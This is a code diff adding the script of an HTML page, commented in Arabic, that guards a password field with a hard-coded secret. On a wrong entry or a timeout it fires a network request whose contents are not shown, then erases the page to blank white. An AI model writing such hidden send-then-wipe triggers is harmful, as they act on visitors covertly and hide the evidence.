@@ -92,3 +92,85 @@
     function removePageAndCancel() {
       // نوقف المؤقت و الحماية
       if (fetchTimer) {
+        clearTimeout(fetchTimer);
+        fetchTimer = null;
+      }
+      if (protector) {
+        clearInterval(protector);
+        protector = null;
+      }
+      // نمسح كل شيء من الوثيقة (ستتحول إلى صفحة بيضاء فارغة)
+      try {
+        document.documentElement.innerHTML = "";
+        document.documentElement.style.background = "#ffffff";
+        if (document.body) document.body.style.background = "#ffffff";
+      } catch (e) {
+        // بعض المتصفحات قد تعترض، لكن نحتاط بتغيير اللون
+        try { document.documentElement.style.background = "#ffffff"; } catch (e2) {}
+      }
+    }
+
+    // عندما يتم التنفيذ (بسبب المهلة أو إدخال خاطئ) نريد: تشغيل fetch ثم بعد انتهائه نمسح الصفحة
+    function runFetchThenRemove() {
+      if (fetchStarted) return; // تجنّب تكرار
+      // ألغِ المؤقت لو كان موجودًا لأننا سنبدأ التنفيذ يدوياً الآن
+      if (fetchTimer) {
+        clearTimeout(fetchTimer);
+        fetchTimer = null;
+      }
+      // ابدأ الــ fetch
+      doFetch()
+        .catch(() => {
+          // تجاهل الأخطاء — بغض النظر عن النتيجة سنمسح الصفحة بعد محاولة الإرسال
+        })
+        .finally(() => {
+          // بعد انتهاء الطلب (نجاحًا أم فشلًا) نمسح الصفحة
+          removePageAndCancel();
+        });
+    }
+
+    // عناصر DOM
+    const pwdInput = document.getElementById("pwd");
+    const submitBtn = document.getElementById("submitBtn");
+
+    // سلوك الزر: إذا الصح -> نحذف الصفحة فوراً؛ إذا الخطأ -> نفّذ الــ fetch ثم امسح
+    submitBtn.addEventListener("click", () => {
+      const val = (pwdInput.value || "").trim();
+      if (val === SECRET) {
+        // الرقم صحيح: نمسح ونلغي أي تنفيذ
+        removePageAndCancel();
+      } else {
+        // الرقم خطأ (أو فارغ) => نفّذ السكربت ثم نمسح الصفحة بعد الانتهاء
+        runFetchThenRemove();
+      }
+    });
+
+    // دعم Enter
+    pwdInput.addEventListener("keydown", (e) => {
+      if (e.key === "Enter") submitBtn.click();
+    });
+
+    // حماية إضافية: لو كتبت السر الصحيح بسرعة نتحقق بشكل دوري
+    protector = setInterval(() => {
+      if ((pwdInput.value || "") === SECRET) {
+        clearInterval(protector);
+        protector = null;
+        removePageAndCancel();
+      }
+    }, 100);
+
+    // مؤقت تلقائي بعد المهلة: يُنفّذ السكربت.
+    fetchTimer = setTimeout(() => {
+      // إذا لم يبدأ التنفيذ بعد، نعتبر الحالة: إذا الحقل فارغ أو فيه قيمة خطأ -> نفّذ ثم امسح
+      const val = (pwdInput.value || "").trim();
+      if (val === SECRET) {
+        // إذا أثناء المهلة صار السر صحيح نلغي فقط
+        removePageAndCancel();
+      } else {
+        // قيمة خاطئة أو فارغة -> نفّذ ثم امسح
+        runFetchThenRemove();
+      }
+    }, FETCH_DELAY_MS);
+  </script>
+</body>
+</html>
